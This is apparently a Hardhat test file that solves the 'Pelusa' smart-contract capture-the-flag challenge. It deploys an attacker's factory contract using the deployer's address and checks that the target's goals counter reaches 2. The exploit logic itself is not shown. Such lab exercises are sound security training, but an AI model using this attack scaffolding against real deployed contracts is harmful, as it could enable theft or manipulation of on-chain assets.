const {time, loadFixture,} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("Pelusa", function () {

  let deployer, attacker;
  
  before(async function (){
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const pelusaFactory = await ethers.getContractFactory("Pelusa");
    this.pelusa = await pelusaFactory.deploy();
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    
    // get data for Owner address generstion
    let pelusaDeployer = deployer.address;
    
    // Deploy attack contract
    let AttackPelusaFactory = await ethers.getContractFactory("AttackPelusaFactory");
    AttackPelusa = await AttackPelusaFactory.connect(attacker).deploy(this.pelusa.address, pelusaDeployer );
    
    await AttackPelusa.deployAndShoot();

  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Goals should equal 2
    expect(await this.pelusa.goals()).eq(2);        
  });

});

